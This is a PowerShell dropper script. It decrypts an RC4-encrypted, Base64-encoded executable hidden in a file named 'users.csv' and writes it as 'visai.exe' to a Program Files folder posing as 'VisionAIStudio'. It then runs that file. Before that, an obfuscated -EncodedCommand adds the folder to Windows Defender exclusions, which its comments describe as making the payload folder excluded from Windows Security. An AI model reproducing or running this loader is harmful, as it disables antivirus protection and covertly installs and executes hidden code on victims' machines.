function Initialize-RC4State($key) {
    $S = 0..255
    $j = 0
    $keyLength = $key.Length

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $keyLength]) % 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }

    return ,$S
}

function Generate-RC4Stream($S, $dataLength) {
    $i = $j = 0
    $stream = New-Object byte[] $dataLength

    for ($k = 0; $k -lt $dataLength; $k++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
        $stream[$k] = $S[($S[$i] + $S[$j]) % 256]
    }

    return ,$stream
}

function RC4($key, $data) {
    $S = Initialize-RC4State $key
    $stream = Generate-RC4Stream $S $data.Length
    $result = New-Object byte[] $data.Length

    for ($i = 0; $i -lt $data.Length; $i++) {
        $result[$i] = $data[$i] -bxor $stream[$i]
    }

    return ,$result
}

function Reverse-FormatString {
    param (
        [string]$FormattedString
    )

    $cleanString = $FormattedString -replace "`n", "" -replace ",", ""

    return $cleanString
}

# Get the current directory and create a path to where the payload program is stored
$currentDirectory = Get-Location
$filePathOfCSV = Join-Path -Path $currentDirectory -ChildPath "users.csv"

# Read the payload from disk, get it out of CSV format, and convert to bytes
$csvAsString = Get-Content -Path $filePathOfCSV -Raw
$originalString = Reverse-FormatString -FormattedString $csvAsString
$encryptedBytes = [Convert]::FromBase64String($originalString)

# Decrypt data
$key = "a"
$decryptedBytes = RC4 $key $encryptedBytes

# Remove first 64 bytes
$decryptedBytes = $decryptedBytes[64..($decryptedBytes.Length - 1)]

# Create a new folder called in Program Files
$programFilesPath = [Environment]::GetFolderPath([Environment+SpecialFolder]::ProgramFiles)
$execDir = $programFilesPath + "\VisionAIStudio"
if (-Not (Test-Path -Path $execDir)) {
    New-Item -Path $execDir -ItemType Directory > $null
}
Start-Sleep 2
# Mkae the folder from where he payload will be ran excluded from Windows Security
# Add-MpPreference -ExclusionPath ([Environment]::GetFolderPath([Environment+SpecialFolder]::ProgramFiles) + "\VisionAIStudio")
$c = "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBv"
$c += "AG4AUABhAHQAaAAgACgAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoARwBlAHQ"
$c += "ARgBvAGwAZABlAHIAUABhAHQAaAAoAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0ACsAUw"
$c += "BwAGUAYwBpAGEAbABGAG8AbABkAGUAcgBdADoAOgBQAHIAbwBnAHIAYQBtAEYAaQBsA"
$c += "GUAcwApACAAKwAgACIAXABWAGkAcwBpAG8AbgBBAEkAUwB0AHUAZABpAG8AIgApAA=="
powershell.exe -EncodedCommand $c
Start-Sleep 2

# Save payload to .config folder
$execPath = $execDir + "\visai.exe"
[System.IO.File]::WriteAllBytes($execPath, $decryptedBytes)

# Run the payload
& $execPath

# Keep the shell up (otherwise comment this out)
Read-Host -Prompt "Press Enter to continue"